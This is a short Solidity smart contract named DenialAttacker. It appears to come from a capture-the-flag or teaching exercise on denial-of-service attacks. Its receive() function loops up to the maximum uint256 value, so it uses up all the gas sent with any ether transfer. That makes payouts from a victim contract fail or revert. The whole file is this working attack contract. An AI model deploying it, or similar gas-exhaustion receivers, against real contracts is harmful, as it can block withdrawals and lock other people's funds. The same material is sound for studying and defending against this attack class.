// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DenialAttacker {
    uint256 private sum;

    receive() external payable {
        uint256 index;
        for (index = 0; index < type(uint256).max; index++) {
            sum += 1;
        }
    }

    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
